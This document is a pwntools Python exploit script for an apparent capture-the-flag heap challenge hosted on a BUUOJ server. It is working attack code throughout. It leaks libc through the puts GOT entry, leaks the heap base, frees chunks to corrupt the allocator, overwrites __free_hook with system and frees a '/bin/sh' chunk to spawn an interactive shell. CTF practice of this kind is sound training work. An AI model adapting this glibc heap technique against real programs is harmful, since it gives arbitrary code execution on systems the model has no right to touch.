#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./main')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./main')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

maps = {"long":"1","double":"2","str":"3"}

def Add(tp,data):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("Type(long=1/double=2/str=3): ")
    p.sendline(maps[tp])
    p.recvuntil("Data: ")
    p.send(data)

def Show(index,tp):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Type(long=1/double=2/str=3): ")
    p.sendline(maps[tp])

def Edit(index,tp,data):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Type(long=1/double=2/str=3): ")
    p.sendline(maps[tp])
    p.recvuntil("Data: ")
    p.send(data)


def Delete(index):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil("Index: ")
    p.sendline(str(index))


def exp():
    #leak libc
    Add("str","/bin/sh")#0
    Add("str","/bin/sh")#1
    puts_got = elf.got["puts"]

    Edit(0,"long",str(puts_got))

    Show(0,"str")
    p.recvuntil("Data: ")
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - libc.sym['puts']
    log.success("libc base => " + hex(libc_base))
    #leak heap
    bss_lis = 0x602100
    Edit(0,"long",str(bss_lis))
    Show(0,"str")
    p.recvuntil("Data: ")
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x2b0
    log.success("heap base => " + hex(heap_base))

    #recover
    Edit(0,"long",str(heap_base+0x2b0))
    Edit(1,"long",str(heap_base+0x2b0))

    Delete(1)
    Delete(0)
    #gdb.attach(p,'b malloc')
    Add("str",p64(libc_base+libc.sym['__free_hook']))
    Add("str","/bin/sh\x00")
    Add("str",p64(libc_base+libc.sym['system']))
    Delete(0)
    p.interactive()

exp()
